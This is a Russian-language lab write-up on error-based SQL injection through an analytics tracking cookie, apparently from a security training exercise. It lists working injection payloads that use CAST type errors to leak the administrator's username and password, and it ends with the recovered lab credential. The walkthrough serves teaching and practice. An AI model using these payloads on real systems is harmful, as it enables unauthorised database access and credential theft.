Лабораторная работа содержит уязвимость, связанную с внедрением SQL. Приложение использует файл cookie отслеживания для аналитики и выполняет запрос SQL, содержащий значение отправленного файла cookie. Результаты запроса SQL не возвращаются.

## Дано

таблица с именем `users`
и её столбцами, называемыми `username` и `password`

## Задача

пароль для `administrator`

# Разведка

В `TrackingId=inO8tAZfNHoQfmBW;` находится sql инъекция  
- при ' ответ 500
- при '' ответ 200
- при '-- ответ 200

Выявляем количество строк UNION
 `' UNION SELECT NULL--` - 1 доступна строка
 
 `' AND CAST((SELECT 1) as int)` - ошибка 
	 `ERROR: argument of AND must be type boolean, not type integer Position: 63`
`' AND 1=CAST((SELECT 1) as int)` - ответ 200 

`' AND 1=CAST((SELECT username from users) as int)--` - ответ 500 что и ожидало но 
```
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = '2EBsAoeBAIL7UjSV' AND 1=CAST((SELECT username from users) as'. Expected  char
```
Из ошибки следует что есть ограничение по символу так как мы видим обрезанный наш payload `' AND 1=CAST((SELECT username from users) as` 

- Пробуем обрезать id cookie где данная уязвимость - всё чутко `ERROR: more than one row returned by a subquery used as an expression`

# Атака

- Формируем запрос к бд чтоб он нам в ошибки выдал конфиденциальные данные 
	`' AND 1=CAST((SELECT username from users LIMIT 1) as int)--` - ERROR: invalid input syntax for type integer: "administrator"
	`' AND 1=CAST((SELECT password from users LIMIT 1) as int)--`

administrator 90713s29lglklc28j6c2